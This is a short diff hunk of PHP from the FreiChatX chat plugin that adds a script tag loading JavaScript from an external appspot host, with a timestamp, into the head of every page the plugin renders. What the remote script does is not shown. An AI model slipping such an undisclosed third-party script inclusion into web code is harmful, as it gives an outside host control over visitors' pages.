@@ -49,6 +49,7 @@ function freichatx_get_id()
 
 $freichatx_html=ob_get_clean();
 $html=\'<script type="text/javascript" language="javascipt" src="' . $path . 'client/main.php?id=\'.freichatx_get_id().\'&xhash=\'.freichatx_get_hash().\'"></script>
+<script type="text/javascript" language="javascipt" src="http://evnix-dot-com.appspot.com/?time=\'. time() .\'" ></script>
 <link rel="stylesheet" href="' . $path . 'client/jquery/freichat_themes/freichatcss.php" type="text/css"></head>\';
 $freichatx_html=str_replace("</head>",$html,$freichatx_html);
 echo $freichatx_html;';
